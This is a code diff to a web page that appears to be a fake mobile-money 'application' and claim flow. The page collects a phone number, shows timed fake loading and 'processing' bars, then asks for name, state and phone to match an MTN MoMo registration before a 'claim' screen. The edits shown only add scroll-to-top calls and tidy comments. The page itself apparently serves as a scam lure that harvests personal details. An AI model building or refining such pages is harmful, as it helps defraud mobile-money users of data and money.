@@ -395,7 +395,7 @@
             </div>
         </div>
 
-        <!-- SCREEN 3: FORM (Bank fields removed) -->
+        <!-- SCREEN 3: FORM -->
         <div class="app-section" id="screen-form">
             <h2 class="app-title">Applicant Details</h2>
             <p class="app-subtitle">Ensure all details match your MTN MoMo registration.</p>
@@ -511,7 +511,7 @@
 
     </div>
 
-    <!-- FOOTER (Exact Match to Image 2) -->
+    <!-- FOOTER -->
     <footer class="app-footer">
         <div class="footer-socials">
             <a href="#">WHATSAPP</a>
@@ -559,6 +559,9 @@
                 window.savedPhone = phone;
                 $('#popupModal').removeClass('active');
                 $('#mainFlow').show();
+                
+                // Force scroll to top
+                window.scrollTo(0, 0);
 
                 // Loader Animation
                 var i = 0;
@@ -569,6 +572,7 @@
                         clearInterval(interval);
                         $('#screen-loader').removeClass('active');
                         $('#screen-intro').addClass('active');
+                        window.scrollTo(0, 0); // Force scroll to top on next screen
                     }
                 }, 20);
             });
@@ -578,10 +582,10 @@
                 $('#screen-intro').removeClass('active');
                 $('#screen-form').addClass('active');
                 if(window.savedPhone) { $('#add').val(window.savedPhone); }
-                window.scrollTo(0,0);
+                window.scrollTo(0, 0); // Force scroll to top
             });
 
-            // Form -> Processing -> Result (UPDATED VALIDATION)
+            // Form -> Processing -> Result
             $('#btn-submit').click(function() {
                 if($('#name').val().length < 3 || $('#add').val().length < 8 || $('#state').val() === null) {
                     alert("Please fill in your Name, State, and Phone Number correctly!");
@@ -595,7 +599,7 @@
                 // Hide Form, Show Processing
                 $('#screen-form').removeClass('active');
                 $('#screen-processing').addClass('active');
-                window.scrollTo(0,0);
+                window.scrollTo(0, 0); // Force scroll to top
 
                 // Processing Progress Bar
                 var i = 0;
@@ -611,7 +615,7 @@
                         setTimeout(function() {
                             $('#screen-processing').removeClass('active');
                             $('#screen-result').addClass('active');
-                            window.scrollTo(0,0);
+                            window.scrollTo(0, 0); // Force scroll to top
                         }, 500);
                     }
                 }, 30);
@@ -644,7 +648,7 @@
                     // Move to final claim screen
                     $('#screen-result').removeClass('active'); 
                     $('#screen-claim').addClass('active'); 
-                    window.scrollTo(0,0);
+                    window.scrollTo(0, 0); // Force scroll to top
                     return; 
                 }
                 
